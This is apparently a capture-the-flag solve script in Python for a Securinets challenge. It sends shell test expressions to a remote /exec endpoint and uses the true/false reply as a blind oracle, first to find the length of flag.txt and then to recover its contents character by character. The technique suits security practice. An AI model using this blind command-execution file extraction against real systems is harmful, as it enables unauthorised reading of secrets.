import requests
import re

def execute_command(command):
    url = 'http://terminaltreachery2.web.securinets.tn/exec' 
    data = {'command': command}
    
    try:
        response = requests.post(url, data=data)
        response.raise_for_status() 
        match = re.search(r'<pre>(.*?)</pre>', response.text)
        if match:
            value = match.group(1) 
            return int(value)
        else:
            print("No value found within <pre> tags.")
    except requests.exceptions.RequestException as e:
        print("An error occurred:", e)

def find_length():
    x = 50
    while True:
        print(x,sep='|')
        command = '[ "$(wc -c < flag.txt |awk \'{$1=$1};1\')"  -gt '+str(x)+' ]' 
        if execute_command('[ "$(wc -c < flag.txt |awk \'{$1=$1};1\')"  = '+str(x)+' ]') :
            break
        elif execute_command(command) == 0 :
            x = x - 1
        else :
            x = x +1 
    return x

def find_flag(x):
    begin = "Securinets{"
    flag = begin
    x = x - len(begin) 
    letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!_{}"
    
    for i in range(len(begin), len(begin) + x):  
        found_letter = False  
        for letter in letters:
            command = f'[ "$(head -c {i+1} flag.txt)" = "{flag + letter}" ]'  
            if execute_command(command) == 1:
                print("Found letter:", letter)
                flag += letter 
                found_letter = True
                break  

        if not found_letter:
            print("No letter found for position", i) 
        print(flag)
        print(f"{x - (i - len(begin) + 1)} letters remaining")  

    return flag



if __name__ == '__main__':
    x=find_length()
    print("the length is :",x)
    flag = find_flag(x)
    print("your flag is : ",flag)
